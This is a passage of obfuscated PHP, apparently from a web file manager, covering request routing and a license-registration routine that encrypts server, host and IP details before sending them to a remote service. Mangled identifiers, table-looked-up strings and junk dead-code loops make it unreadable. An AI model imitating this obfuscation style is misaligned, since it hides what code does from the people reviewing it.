$ÜŸÉàÒ =& $_SERVER[÷ôÚîå]; $İ§Ú¯ñğ =& $_SERVER[ü÷’á¨À]; $ÜÕ®¶ÑŒ = explode($İ§Ú¯ñğ[0], $šè¯–®Ç); $àáöĞÂ = $ÜŸÉàÒ[698]; while (strlen($àáöĞÂ) < $ÜŸÉàÒ[693]) { if (!$àáöĞÂ) { break; } $àáöĞÂ++; } $ø“ˆ‰–« = strtolower($ÜÕ®¶ÑŒ[0]); $ñõ€¿Óé = $ÜŸÉàÒ[699]; $î ›ñ¡§ = $İ§Ú¯ñğ[3]; if ($ø“ˆ‰–« == $İ§Ú¯ñğ[4]) { $î ›ñ¡§ = $İ§Ú¯ñğ[5]; $ÜÕ®¶ÑŒ[0] = $İ§Ú¯ñğ[6]; $ÜÕ®¶ÑŒ[1] = $ÜÕ®¶ÑŒ[1] . $İ§Ú¯ñğ[7]; $šè¯–®Ç = join($İ§Ú¯ñğ[0], $ÜÕ®¶ÑŒ); $šè¯–®Ç = trim($šè¯–®Ç, $İ§Ú¯ñğ[0]); } call_user_func(array($İ§Ú¯ñğ[8], $İ§Ú¯ñğ[9]), $î ›ñ¡§ . $İ§Ú¯ñğ[10], $šè¯–®Ç); ActionCall($šè¯–®Ç); $ËŸ˜÷¯Ì = $ÜŸÉàÒ[700]; if (!$ËŸ˜÷¯Ì) { return; } call_user_func(array($İ§Ú¯ñğ[8], $İ§Ú¯ñğ[9]), $î ›ñ¡§ . $İ§Ú¯ñğ[11], $šè¯–®Ç); } private function autorun() { $ŒÛÅ€Ôº =& $_SERVER[÷ôÚîå]; $âğ»ïÙ• =& $_SERVER[ü÷’á¨À]; global $config; $Õ²ÅŠ…ø = $ŒÛÅ€Ôº[701]; if (strlen($Õ²ÅŠ…ø) < $ŒÛÅ€Ôº[697]) { return; } if (count($config[$âğ»ïÙ•[12]]) == 0) { return; } foreach ($config[$âğ»ïÙ•[12]] as $áÚŠ¥‚­ => $¶ìŸå³ã) { $this->appRun($¶ìŸå³ã); $Û•âÂß¾ = $ŒÛÅ€Ôº[702]; if (!$Û•âÂß¾) { die; } } } private function funcd7c9c093() { $®Íš¦çî =& $_SERVER[÷ôÚîå]; $”¼»£•Ö =& $_SERVER[ü÷’á¨À]; $ÁÁ’½óœ = $”¼»£•Ö[4]; $·÷ŒÊÓß = $®Íš¦çî[703]; if (strlen($·÷ŒÊÓß) < $®Íš¦çî[697]) { return; } $óÁº¾“ = $GLOBALS[$”¼»£•Ö[13]][$”¼»£•Ö[14]][0]; $ù­€æõ = $®Íš¦çî[704]; if (!$ù­€æõ) { die; } if (!$óÁº¾“ || strlen($óÁº¾“) <= strlen($ÁÁ’½óœ)) { return; } if (strtolower(substr($óÁº¾“, -strlen($ÁÁ’½óœ))) != $ÁÁ’½óœ) { return; } $²‹îúÆ³ = substr($óÁº¾“, 0, -strlen($ÁÁ’½óœ)); $Œ”‚®¨” = $®Íš¦çî[705]; if (!$Œ”‚®¨”) { return; } $Óó†Êşä = array($”¼»£•Ö[4], $²‹îúÆ³); $¤æŸ ±¯ = array_slice($GLOBALS[$”¼»£•Ö[13]][$”¼»£•Ö[14]], 1); $GLOBALS[$”¼»£•Ö[13]][$”¼»£•Ö[14]] = array_merge($Óó†Êşä, $¤æŸ ±¯); $şë¾‹§ƒ = $®Íš¦çî[706]; if (strlen($şë¾‹§ƒ) < $®Íš¦çî[693]) { return; } $GLOBALS[$”¼»£•Ö[13]][$”¼»£•Ö[15]] = implode($”¼»£•Ö[0], $GLOBALS[$”¼»£•Ö[13]][$”¼»£•Ö[14]]); } private function lszm3769197c() { $äŞ¨ûüÊ =& $_SERVER[÷ôÚîå]; $µ½©õÎ =& $_SERVER[ü÷’á¨À]; if ($GLOBALS[$µ½©õÎ[13]][$µ½©õÎ[15]] != $µ½©õÎ[6]) { return; } $ûä¹µ©ğ = $_SERVER[$µ½©õÎ[16]]; $ô»¬Îàï = $µ½©õÎ[17]; if (!strstr($ûä¹µ©ğ, $ô»¬Îàï)) { return; } $ØÄÂØœõ = strrpos($ûä¹µ©ğ, $ô»¬Îàï); $şà‰÷ç¶ = $äŞ¨ûüÊ[707]; if (!$şà‰÷ç¶) { die; } $°“ö­’ = substr($ûä¹µ©ğ, $ØÄÂØœõ + strlen($ô»¬Îàï)); $¼Õ¾îíÏ = $äŞ¨ûüÊ[708]; if (!$¼Õ¾îíÏ) { die; } preg_match_all($µ½©õÎ[18], $°“ö­’, $°ÍùŠÛ§); $¤©¡™ § = $äŞ¨ûüÊ[709]; while ($¤©¡™ § < $äŞ¨ûüÊ[66]) { if ($¤©¡™ § >= 0) { break; } $¤©¡™ §++; } $°“ö­’ = trim($°ÍùŠÛ§[0][0], $µ½©õÎ[19]); $GLOBALS[$µ½©õÎ[13]][$µ½©õÎ[14]] = explode($µ½©õÎ[19], $°“ö­’); $GLOBALS[$µ½©õÎ[13]][$µ½©õÎ[15]] = implode($µ½©õÎ[0], $GLOBALS[$µ½©õÎ[13]][$µ½©õÎ[14]]); $Ñ¼ˆò­Ó = $äŞ¨ûüÊ[710]; while ($Ñ¼ˆò­Ó < $äŞ¨ûüÊ[711]) { if ($Ñ¼ˆò­Ó >= 0) { break; } $Ñ¼ˆò­Ó++; } } public function run() { $³çÍ¨Ü =& $_SERVER[÷ôÚîå]; $£Œ¼èÍ =& $_SERVER[ü÷’á¨À]; $this->lszm3769197c(); $ì“¥¿­« = $³çÍ¨Ü[712]; if (strlen($ì“¥¿­«) < $³çÍ¨Ü[711]) { return; } $this->funcd7c9c093(); $¿çë‰ = $³çÍ¨Ü[713]; while (strlen($¿çë‰) < $³çÍ¨Ü[693]) { if (!$¿çë‰) { break; } $¿çë‰++; } $­·éßòÜ = $GLOBALS[$£Œ¼èÍ[13]][$£Œ¼èÍ[14]]; $“º„øıî = $³çÍ¨Ü[714]; if (!$“º„øıî) { return; } $Ä„Û·±÷ = $GLOBALS[$£Œ¼èÍ[13]][$£Œ¼èÍ[15]]; define($£Œ¼èÍ[20], isset($­·éßòÜ[0]) && $­·éßòÜ[0] ? $­·éßòÜ[0] : $this->defaultModule); define($£Œ¼èÍ[21], isset($­·éßòÜ[1]) && $­·éßòÜ[0] ? $­·éßòÜ[1] : $this->defaultController); $“‰Ÿøì© = $³çÍ¨Ü[715]; if (strlen($“‰Ÿøì©) < $³çÍ¨Ü[66]) { return; } define($£Œ¼èÍ[22], isset($­·éßòÜ[2]) && $­·éßòÜ[0] ? $­·éßòÜ[2] : $this->defaultAction); define($£Œ¼èÍ[23], MOD . $£Œ¼èÍ[0] . ST . $£Œ¼èÍ[0] . ACT); $òÌªé Œ = $³çÍ¨Ü[716]; $_SERVER[$£Œ¼èÍ[24]] = strtolower(ACTION); $ØìˆöÓ§ = $³çÍ¨Ü[717]; while ($ØìˆöÓ§ < $³çÍ¨Ü[711]) { if ($ØìˆöÓ§ >= 0) { break; } $ØìˆöÓ§++; } $this->autorun(); $øÈĞ¨íİ = $³çÍ¨Ü[718]; while (strlen($øÈĞ¨íİ) < $³çÍ¨Ü[695]) { if (!$øÈĞ¨íİ) { break; } $øÈĞ¨íİ++; } if (count($­·éßòÜ) >= 3) { $this->appRun($Ä„Û·±÷); } else { $this->appRun(ACTION); } } private $dglic348d3e7 = array(); private $epqlbb24357a = ''; public function qmkdbc74139a() { $–‘ÉßãÓ =& $_SERVER[÷ôÚîå]; $Œæš‰”Ä =& $_SERVER[ü÷’á¨À]; $this->irztf84686f7(); $this->lvhs11600b5d(); $ª”ÜŒ¾ì = $–‘ÉßãÓ[719]; $this->dozu0534b089(); $ú€ìŒ·ƒ = $–‘ÉßãÓ[720]; while (strlen($ú€ìŒ·ƒ) < $–‘ÉßãÓ[711]) { if (!$ú€ìŒ·ƒ) { break; } $ú€ìŒ·ƒ++; } $this->xltd7fd37420(); $»ÖÀÛÚ = $–‘ÉßãÓ[721]; if (!$»ÖÀÛÚ) { return; } $this->dvaf25219347(); $this->hnsv5ac96b7b(); $this->krsm180cb74b(); $this->vglc9d6a43bb($Œæš‰”Ä[25], array($this, $Œæš‰”Ä[26])); $»€Ò»Ë = $–‘ÉßãÓ[722]; if (!$»€Ò»Ë) { return; } $this->vglc9d6a43bb($Œæš‰”Ä[27], array($this, $Œæš‰”Ä[28])); $»¯×è•ô = $–‘ÉßãÓ[723]; $this->vglc9d6a43bb($Œæš‰”Ä[29], array($this, $Œæš‰”Ä[30])); $this->vglc9d6a43bb($Œæš‰”Ä[31], array($this, $Œæš‰”Ä[32])); } public function mted32d2229f($è²™•à) { $Çß»ğÁ =& $_SERVER[÷ôÚîå]; $òí¼ù™ =& $_SERVER[ü÷’á¨À]; $³Á£êŸÇ = Model($òí¼ù™[33])->get(); $Ø€€×Ü¶ = array($òí¼ù™[34], $òí¼ù™[35], $òí¼ù™[36], $òí¼ù™[37], $òí¼ù™[38], $òí¼ù™[39], $òí¼ù™[40], $òí¼ù™[41], $òí¼ù™[42], $òí¼ù™[43], $òí¼ù™[44], $òí¼ù™[45], $òí¼ù™[46], $òí¼ù™[47], $òí¼ù™[48], $òí¼ù™[49], $òí¼ù™[50], $òí¼ù™[51], $òí¼ù™[52], $òí¼ù™[53], $òí¼ù™[54], $òí¼ù™[55], $òí¼ù™[56], $òí¼ù™[57], $òí¼ù™[58], $òí¼ù™[59], $òí¼ù™[60], $òí¼ù™[61], $òí¼ù™[62], $òí¼ù™[63], $òí¼ù™[64], $òí¼ù™[65], $òí¼ù™[66], $òí¼ù™[67], $òí¼ù™[68], $òí¼ù™[69], $òí¼ù™[70], $òí¼ù™[71], $òí¼ù™[72], $òí¼ù™[73], $òí¼ù™[74], $òí¼ù™[75], $òí¼ù™[76], $òí¼ù™[77], $òí¼ù™[78], $òí¼ù™[79], $òí¼ù™[80], $òí¼ù™[81], $òí¼ù™[82], $òí¼ù™[83], $òí¼ù™[84], $òí¼ù™[85]); foreach ($Ø€€×Ü¶ as $åòÇÑò²) { $ Ú„œÅÅ = $GLOBALS[$òí¼ù™[86]][$òí¼ù™[87]][$åòÇÑò²]; if (isset($³Á£êŸÇ[$åòÇÑò²])) { $ Ú„œÅÅ = $³Á£êŸÇ[$åòÇÑò²]; } $è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$åòÇÑò²] = $ Ú„œÅÅ; } $ÌÁµ³¸ = $è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$òí¼ù™[46]]; unset($è²™•à[$òí¼ù™[88]][$òí¼ù™[90]][$òí¼ù™[91]]); unset($è²™•à[$òí¼ù™[88]][$òí¼ù™[90]][$òí¼ù™[92]]); $şğïñÅé = $Çß»ğÁ[724]; if (!$şğïñÅé) { return; } unset($è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$òí¼ù™[46]]); unset($è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$òí¼ù™[93]]); $òÏ‡¦·­ = $Çß»ğÁ[725]; if (!$òÏ‡¦·­) { die; } $è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$òí¼ù™[94]] = array($òí¼ù™[95] => (int) $ÌÁµ³¸[$òí¼ù™[96]], $òí¼ù™[97] => (int) _get($ÌÁµ³¸, $òí¼ù™[98], 0)); $ÎÖ°ÑåÆ = substr(md5($òí¼ù™[99] . get_client_ip() . $³Á£êŸÇ[$òí¼ù™[100]]), 0, 15); $è²™•à[$òí¼ù™[101]][$òí¼ù™[102]] = Mcrypt::encode(Session::sign(), $ÎÖ°ÑåÆ, 3600 * 24); $˜‚ öÕ© = $Çß»ğÁ[726]; $è²™•à[$òí¼ù™[101]][$òí¼ù™[103]] = Action($òí¼ù™[104])->accessToken(); $å´‚óÇŸ = $Çß»ğÁ[727]; while ($å´‚óÇŸ < $Çß»ğÁ[711]) { if ($å´‚óÇŸ >= 0) { break; } $å´‚óÇŸ++; } $è²™•à[$òí¼ù™[101]][$òí¼ù™[105]] = md5($_SERVER[$òí¼ù™[106]] . $³Á£êŸÇ[$òí¼ù™[100]]); $ÖôµòŸ… = $Çß»ğÁ[728]; if (strlen($ÖôµòŸ…) < $Çß»ğÁ[693]) { return; } $è²™•à[$òí¼ù™[101]][$òí¼ù™[107]] = base64_encode(serverInfo()); $Ú¡¹¢¨° = $Çß»ğÁ[729]; while (strlen($Ú¡¹¢¨°) < $Çß»ğÁ[711]) { if (!$Ú¡¹¢¨°) { break; } $Ú¡¹¢¨°++; } $è²™•à[$òí¼ù™[101]][$òí¼ù™[108]] = $this->epqlbb24357a; $ú€ê©¬ù = $Çß»ğÁ[730]; if ($³Á£êŸÇ[$òí¼ù™[108]] != $òí¼ù™[109]) { $è²™•à[$òí¼ù™[101]][$òí¼ù™[110]] = $³Á£êŸÇ[$òí¼ù™[110]]; $è²™•à[$òí¼ù™[101]][$òí¼ù™[111]] = $³Á£êŸÇ[$òí¼ù™[111]]; $Ğœ™Õâù = rand_string(10) . $this->epqlbb24357a . rand_string(5); $è²™•à[$òí¼ù™[88]][$òí¼ù™[112]][$òí¼ù™[113]] = $this->owqeda6d1c03($Ğœ™Õâù, $è²™•à[$òí¼ù™[101]][$òí¼ù™[105]]); } if ($this->epqlbb24357a == $òí¼ù™[109]) { $è²™•à[$òí¼ù™[88]][$òí¼ù™[89]][$òí¼ù™[94]][$òí¼ù™[98]] = 0; } $è²™•à[$òí¼ù™[101]][$òí¼ù™[114]] = $this->versionPluginFilter(); $è²™•à[$òí¼ù™[101]][$òí¼ù™[115]] = _get($this->dglic348d3e7, $òí¼ù™[116], $òí¼ù™[6]); $†ÌòöÛ = $Çß»ğÁ[731]; if (KodUser::isRoot() && $this->config[$òí¼ù™[117]]) { $è²™•à[$òí¼ù™[101]][$òí¼ù™[118]] = WEB_ROOT; } return $è²™•à; } private function hnsv5ac96b7b() { $ãÕõºè‘ =& $_SERVER[÷ôÚîå]; $õ‡Ş×ÍŞ =& $_SERVER[ü÷’á¨À]; $¥‰Ï¿Ç‡ = $_SERVER[$õ‡Ş×ÍŞ[24]] == $õ‡Ş×ÍŞ[119]; $Ã˜·òï¥ = $ãÕõºè‘[732]; if (strlen($Ã˜·òï¥) < $ãÕõºè‘[693]) { return; } if ($_SERVER[$õ‡Ş×ÍŞ[24]] == $õ‡Ş×ÍŞ[120] && $_GET[$õ‡Ş×ÍŞ[121]] == $õ‡Ş×ÍŞ[122]) { $¥‰Ï¿Ç‡ = !0; } if ($¥‰Ï¿Ç‡) { $´šèä×ù = array($õ‡Ş×ÍŞ[108] => $this->epqlbb24357a, $õ‡Ş×ÍŞ[123] => $this->ieqg85770236(), $õ‡Ş×ÍŞ[124] => Model($õ‡Ş×ÍŞ[125])->count()); if ($this->epqlbb24357a != $õ‡Ş×ÍŞ[109]) { $–™¿Îï = _get($this->dglic348d3e7, $õ‡Ş×ÍŞ[126]); if ($–™¿Îï) { $´šèä×ù[$õ‡Ş×ÍŞ[127]] = $–™¿Îï; $´šèä×ù[$õ‡Ş×ÍŞ[128]] = strtotime(_get($this->dglic348d3e7, $õ‡Ş×ÍŞ[129])); $´šèä×ù[$õ‡Ş×ÍŞ[130]] = _get($this->dglic348d3e7, $õ‡Ş×ÍŞ[116]); } $¡­ÛÑ• = Model($õ‡Ş×ÍŞ[33])->get($õ‡Ş×ÍŞ[131], $õ‡Ş×ÍŞ[6], !0); if (is_string($¡­ÛÑ•) && substr($¡­ÛÑ•, 0, 1) == $õ‡Ş×ÍŞ[132]) { $¡­ÛÑ• = json_decode_force($¡­ÛÑ•); } if (is_array($¡­ÛÑ•) && $¡­ÛÑ•[$õ‡Ş×ÍŞ[133]] && strstr($¡­ÛÑ•[$õ‡Ş×ÍŞ[133]], $õ‡Ş×ÍŞ[134])) { $»è”º§³ = explode($õ‡Ş×ÍŞ[134], $¡­ÛÑ•[$õ‡Ş×ÍŞ[133]]); $´šèä×ù[$õ‡Ş×ÍŞ[135]] = $»è”º§³[0]; } } $´šèä×ù = $this->nqtc058e3ce5(json_encode($´šèä×ù), md5($õ‡Ş×ÍŞ[136])); $ûõ¿’Êö = $ãÕõºè‘[733]; if (!$ûõ¿’Êö) { die; } $‚›ÓºÈÉ = array($õ‡Ş×ÍŞ[137] => $´šèä×ù); $¥í“ÑÂ¿ = $ãÕõºè‘[734]; while ($¥í“ÑÂ¿ < $ãÕõºè‘[695]) { if ($¥í“ÑÂ¿ >= 0) { break; } $¥í“ÑÂ¿++; } call_user_func(array($õ‡Ş×ÍŞ[138], $õ‡Ş×ÍŞ[139]), $‚›ÓºÈÉ); } if ($this->epqlbb24357a == $õ‡Ş×ÍŞ[109]) { return; } $“‹èà²¡ = array($õ‡Ş×ÍŞ[140], $õ‡Ş×ÍŞ[141], $õ‡Ş×ÍŞ[142], $õ‡Ş×ÍŞ[143], $õ‡Ş×ÍŞ[144], $õ‡Ş×ÍŞ[145]); $Ÿ˜Š©ÓÏ = $ãÕõºè‘[735]; if (!$Ÿ˜Š©ÓÏ) { die; } $çÔÇ¤Ä = Model($õ‡Ş×ÍŞ[33])->get(); $‚›ÓºÈÉ = array($õ‡Ş×ÍŞ[146] => $çÔÇ¤Ä[$õ‡Ş×ÍŞ[34]], $õ‡Ş×ÍŞ[147] => $çÔÇ¤Ä[$õ‡Ş×ÍŞ[35]], $õ‡Ş×ÍŞ[148] => $õ‡Ş×ÍŞ[6]); foreach ($“‹èà²¡ as $ŠûÅÛñ¡) { if (!isset($çÔÇ¤Ä[$ŠûÅÛñ¡]) || !$çÔÇ¤Ä[$ŠûÅÛñ¡]) { continue; } $‚›ÓºÈÉ[$ŠûÅÛñ¡] = $çÔÇ¤Ä[$ŠûÅÛñ¡]; $ÊêêÈ¤ƒ = $ãÕõºè‘[736]; if (strlen($ÊêêÈ¤ƒ) < $ãÕõºè‘[695]) { return; } } call_user_func(array($õ‡Ş×ÍŞ[138], $õ‡Ş×ÍŞ[139]), $‚›ÓºÈÉ); $ûŸ®ŠñŒ = $ãÕõºè‘[737]; } private function xltd7fd37420() { $”ˆ£íÍ =& $_SERVER[÷ôÚîå]; $ğ©Ç¨ÅÓ =& $_SERVER[ü÷’á¨À]; if ($_SERVER[$ğ©Ç¨ÅÓ[24]] != $ğ©Ç¨ÅÓ[149]) { return; } if (!KodUser::isRoot()) { die; } $ù­Ñ‡Ø  = $GLOBALS[$ğ©Ç¨ÅÓ[13]]; if (isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[150]])) { $this->gnst46c66674(); die; } if (isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[151]]) && isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[151]]) == $ğ©Ç¨ÅÓ[122]) { $ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[152]] = Model($ğ©Ç¨ÅÓ[33])->get($ğ©Ç¨ÅÓ[153]); } if (!isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[152]]) || strlen($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[152]]) != 16) { show_json($ğ©Ç¨ÅÓ[154] . $ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[152]], !1); } $ù÷‘Ô…Á = Model($ğ©Ç¨ÅÓ[33])->get($ğ©Ç¨ÅÓ[100]); $§úöŠŞá = md5($_SERVER[$ğ©Ç¨ÅÓ[106]] . $ù÷‘Ô…Á); $¦×›öãô = $”ˆ£íÍ[738]; if (strlen($¦×›öãô) < $”ˆ£íÍ[693]) { return; } $…¥í¼º¥ = array($ğ©Ç¨ÅÓ[152] => $ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[152]], $ğ©Ç¨ÅÓ[155] => rand_string(16), $ğ©Ç¨ÅÓ[156] => $ğ©Ç¨ÅÓ[136], $ğ©Ç¨ÅÓ[157] => $ğ©Ç¨ÅÓ[158], $ğ©Ç¨ÅÓ[159] => $_SERVER[$ğ©Ç¨ÅÓ[160]], $ğ©Ç¨ÅÓ[161] => $_SERVER[$ğ©Ç¨ÅÓ[162]], $ğ©Ç¨ÅÓ[163] => $_SERVER[$ğ©Ç¨ÅÓ[164]], $ğ©Ç¨ÅÓ[105] => $§úöŠŞá, $ğ©Ç¨ÅÓ[165] => Model($ğ©Ç¨ÅÓ[33])->get($ğ©Ç¨ÅÓ[131])); $ó¸‡óŸ’ = $”ˆ£íÍ[739]; if (!$ó¸‡óŸ’) { die; } if (isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[151]]) && isset($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[151]]) == $ğ©Ç¨ÅÓ[122]) { $…¥í¼º¥[$ğ©Ç¨ÅÓ[151]] = md5($…¥í¼º¥[$ğ©Ç¨ÅÓ[152]] . $ğ©Ç¨ÅÓ[166] . $…¥í¼º¥[$ğ©Ç¨ÅÓ[155]]); } if ($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[167]] == $ğ©Ç¨ÅÓ[168]) { $Š°Æ’ÃÚ = $this->nqtc058e3ce5($§úöŠŞá, $ğ©Ç¨ÅÓ[169]); $¤³âÛ±° = $this->owqeda6d1c03(json_encode($…¥í¼º¥), $§úöŠŞá . $ğ©Ç¨ÅÓ[170], 3); $¤³âÛ±° = $¤³âÛ±° . $ğ©Ç¨ÅÓ[171] . $_SERVER[$ğ©Ç¨ÅÓ[160]]; $øÀëŸ¹¯ = $this->uyzp50af60cd($ğ©Ç¨ÅÓ[172] . $Š°Æ’ÃÚ . $ğ©Ç¨ÅÓ[173] . $¤³âÛ±°, -1); show_json($øÀëŸ¹¯, !0); } else { if ($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[167]] == $ğ©Ç¨ÅÓ[174]) { $úùÑÔ² = substr(md5($ğ©Ç¨ÅÓ[175] . $§úöŠŞá), 12, 15) . $ğ©Ç¨ÅÓ[176]; $¤³âÛ±° = $this->lqdm6259e359(trim($ù­Ñ‡Ø [$ğ©Ç¨ÅÓ[177]]), $úùÑÔ², 2); $¡ÆûÔÆ = json_decode($¤³âÛ±°, !0); if (!is_array($¡ÆûÔÆ) || !is_array($¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]]) || $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[152]] != !0) { $·‡ì‚Í = $ğ©Ç¨ÅÓ[179]; $Èå¤è‰Ú = $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]] ? $ğ©Ç¨ÅÓ[180] . $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]] : $·‡ì‚Í; show_json($Èå¤è‰Ú, !1); } else { $…¥í¼º¥[$ğ©Ç¨ÅÓ[155]] = $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]][$ğ©Ç¨ÅÓ[181]]; } } else { $¡ÆûÔÆ = $this->uyzp50af60cd($ğ©Ç¨ÅÓ[182], $…¥í¼º¥, 10); } } if (!is_array($¡ÆûÔÆ) || !is_array($¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]]) || $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[152]] != !0) { $·‡ì‚Í = LNG($ğ©Ç¨ÅÓ[183]); $Èå¤è‰Ú = $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]] ? $ğ©Ç¨ÅÓ[180] . $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]] : $·‡ì‚Í; show_json($Èå¤è‰Ú, !1); } $Öü²äâ = $¡ÆûÔÆ[$ğ©Ç¨ÅÓ[178]]; $¼­ÀÛçœ = $this->olhwee7f1482($Öü²äâ[$ğ©Ç¨ÅÓ[184]]); if (!$¼­ÀÛçœ || $¼­ÀÛçœ != $Öü²äâ[$ğ©Ç¨ÅÓ[129]]) { $›¯ÚĞ¬­ = array($ğ©Ç¨ÅÓ[185] => Model($ğ©Ç¨ÅÓ[33])->get($ğ©Ç¨ÅÓ[100]), $ğ©Ç¨ÅÓ[186] => $_SERVER[$ğ©Ç¨ÅÓ[106]], $ğ©Ç¨ÅÓ[187] => this_url(), $ğ©Ç¨ÅÓ[161] => $_SERVER[$ğ©Ç¨ÅÓ[162]]); $¤³âÛ±° = $this->rjzp2d0cc6b4(json_encode($›¯ÚĞ¬­)); $this->uyzp50af60cd($ğ©Ç¨ÅÓ[188] . $¤³âÛ±°); show_json(LNG($ğ©Ç¨ÅÓ[189]), !0); } $ù¬ƒ–°’ = array($ğ©Ç¨ÅÓ[153] => $Öü²äâ[$ğ©Ç¨ÅÓ[190]], $ğ©Ç¨ÅÓ[191] => $Öü²äâ[$ğ©Ç¨ÅÓ[192]], $ğ©Ç¨ÅÓ[193] => rand_string(16), $ğ©Ç¨ÅÓ[108] => $Öü²äâ[$ğ©Ç¨ÅÓ[194]]); if ($…¥í¼º¥[$ğ©Ç¨ÅÓ[155]]) { $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[193]] = $…¥í¼º¥[$ğ©Ç¨ÅÓ[155]]; } $ÃƒÁÙµÍ = substr(md5($ù¬ƒ–°’[$ğ©Ç¨ÅÓ[191]]), 10, 10); $¿Œ†óı¼ = $ÃƒÁÙµÍ . $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[108]] . $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[193]]; $äÚ°¸ïŠ = $”ˆ£íÍ[740]; if (!$äÚ°¸ïŠ) { die; } $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[110]] = strrev(base64_encode($this->nqtc058e3ce5($¿Œ†óı¼, $ğ©Ç¨ÅÓ[195]))); $¢©íŠÚì = $”ˆ£íÍ[741]; if (!$¢©íŠÚì) { die; } $§éçÈÈå = rand_string(16); $ÓÏ¼¶Ê¶ = $”ˆ£íÍ[742]; if (strlen($ÓÏ¼¶Ê¶) < $”ˆ£íÍ[697]) { return; } $şÌË™¿÷ = $§éçÈÈå . $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[108]] . $this->nqtc058e3ce5(md5($ù¬ƒ–°’[$ğ©Ç¨ÅÓ[153]]), $§éçÈÈå); $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[111]] = base64_encode(strrev($this->nqtc058e3ce5($şÌË™¿÷, $ğ©Ç¨ÅÓ[196]))); if ($Öü²äâ[$ğ©Ç¨ÅÓ[197]] && $Öü²äâ[$ğ©Ç¨ÅÓ[197]] >= 1) { Model($ğ©Ç¨ÅÓ[33])->setDeep($ğ©Ç¨ÅÓ[198], $ğ©Ç¨ÅÓ[122]); } Model($ğ©Ç¨ÅÓ[33])->set($ù¬ƒ–°’); $§ÚÕò‡ = md5($_SERVER[$ğ©Ç¨ÅÓ[106]] . strrev($ù÷‘Ô…Á) . $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[191]]); $”ƒİ¨”î = strrev(substr($§ÚÕò‡, 10, 16)); $¯‘ñ·‘ˆ = $this->owqeda6d1c03(json_encode($Öü²äâ), $§ÚÕò‡); $¡æ­ãÀ = $”ˆ£íÍ[743]; $Ü‹À‡® = array_to_keyvalue(Model($ğ©Ç¨ÅÓ[7])->listData(), $ğ©Ç¨ÅÓ[199]); $’¦“Æµğ = $”ˆ£íÍ[744]; if (strlen($’¦“Æµğ) < $”ˆ£íÍ[693]) { die; } $õèÏ–ÁŠ = $Ü‹À‡®[$ğ©Ç¨ÅÓ[200]]; $ƒšÍâËˆ = array(); $ƒšÍâËˆ[$”ƒİ¨”î] = $¯‘ñ·‘ˆ; $†ÏÚ“ïÅ = $”ˆ£íÍ[745]; Model($ğ©Ç¨ÅÓ[7])->update($õèÏ–ÁŠ[$ğ©Ç¨ÅÓ[201]], array($ğ©Ç¨ÅÓ[202] => $ƒšÍâËˆ)); $‚©ø³œË = $”ˆ£íÍ[746]; if (!$‚©ø³œË) { die; } $this->dglic348d3e7 = $Öü²äâ; $this->epqlbb24357a = $ù¬ƒ–°’[$ğ©Ç¨ÅÓ[108]]; $†ç”“™å = $”ˆ£íÍ[747]; while (strlen($†ç”“™å) < $”ˆ£íÍ[693]) { if (!$†ç”“™å) { break; } $†ç”“™å++; } $this->licenseRegistSuccess(); $·ƒë±ÜÔ = $”ˆ£íÍ[748]; if (!$·ƒë±ÜÔ) { return; } Cache::set($ğ©Ç¨ÅÓ[203] . md5($ù÷‘Ô…Á . $ğ©Ç¨ÅÓ[204]), $ğ©Ç¨ÅÓ[6]); show_json(LNG($ğ©Ç¨ÅÓ[189]), !0); $€¢¼õ¢Ñ = $”ˆ£íÍ[749]; } private function licenseRegistSuccess() { $Íï®óíÔ =& $_SERVER[ü÷’á¨À]; $ä†Ä¹îâ = Model($Íï®óíÔ[33])->get(); if ($ä†Ä¹îâ[$Íï®óíÔ[63]] != $Íï®óíÔ[122]) { Model($Íï®óíÔ[33])->set($Íï®óíÔ[63], $Íï®óíÔ[122]); } Action($Íï®óíÔ[205])->initStart(!0); } private function gnst46c66674() { $¸á¢—¥ =& $_SERVER[÷ôÚîå]; $şºÔñ =& $_SERVER[ü÷’á¨À]; Model($şºÔñ[33])->set(array($şºÔñ[153] => $şºÔñ[6], $şºÔñ[191] => $şºÔñ[6], $şºÔñ[108] => $şºÔñ[109], $şºÔñ[110] => $şºÔñ[6], $şºÔñ[111] => $şºÔñ[6])); $°ÑÏ¶È = $¸á¢—¥[750]; if (!$°ÑÏ¶È) { die; } Model($şºÔñ[33])->setDeep($şºÔñ[198], $şºÔñ[206]); $Öü†ÀÓ = $¸á¢—¥[751]; if (strlen($Öü†ÀÓ) < $¸á¢—¥[695]) { die; } $this->dglic348d3e7 = array(); $this->epqlbb24357a = $şºÔñ[109]; } private function irztf84686f7() { $€ÆóµÙò =& $_SERVER[÷ôÚîå]; $çÁ¢·æà =& $_SERVER[ü÷’á¨À]; $_SERVER[$çÁ¢·æà[162]] = _get($_SERVER, $çÁ¢·æà[162], APP_HOST); $this->epqlbb24357a = $çÁ¢·æà[109]; $Öì¼×ÊÊ = $€ÆóµÙò[752]; $İŞË››¹ = 